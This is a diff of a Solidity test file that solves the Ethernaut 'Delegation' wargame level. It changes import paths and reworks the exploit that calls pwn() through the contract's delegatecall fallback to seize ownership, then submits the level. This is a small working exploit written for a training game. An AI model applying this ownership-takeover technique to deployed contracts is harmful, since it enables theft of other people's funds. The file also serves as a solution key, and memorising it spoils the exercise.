@@ -1,45 +1,39 @@
-pragma solidity ^0.8.10;
+pragma solidity ^0.8.19;
 
 import "ds-test/test.sol";
-import "../Delegation/DelegationFactory.sol";
-import "../Ethernaut.sol";
-import "./utils/vm.sol";
+import "../../src/Delegation/DelegationFactory.sol";
+import "../../src/Ethernaut.sol";
+import "../../src/test/utils/vm.sol";
+// import "../../src/Token/NothingToSee.sol";
 
-contract DelegationTest is DSTest {
+contract DelegateTestz is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
+    Delegation delegation;
+    address eoaAddress = address(100);
 
     function setUp() public {
         // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
+        // Deal EOA address some ether
+        vm.deal(eoaAddress, 5 ether);
     }
 
-    function testDelegationHack() public {
+    function testDelegatecall() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
 
         DelegationFactory delegationFactory = new DelegationFactory();
         ethernaut.registerLevel(delegationFactory);
-        vm.startPrank(tx.origin);
+        vm.startPrank(eoaAddress);
         address levelAddress = ethernaut.createLevelInstance(delegationFactory);
         Delegation ethernautDelegation = Delegation(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        // Determine method hash, required for function call
-        bytes4 methodHash = bytes4(keccak256("pwn()"));
-
-        // Call the pwn() method via .call plus abi encode the method hash switch from bytes4 to bytes memory
-        address(ethernautDelegation).call(abi.encode(methodHash));
-
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-
+        // attack
+        bytes memory payload = abi.encodeWithSignature("pwn()");
+        address(ethernautDelegation).call(payload);
+        emit log_named_address("owner after attack", ethernautDelegation.owner());
+        // submit level instance
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
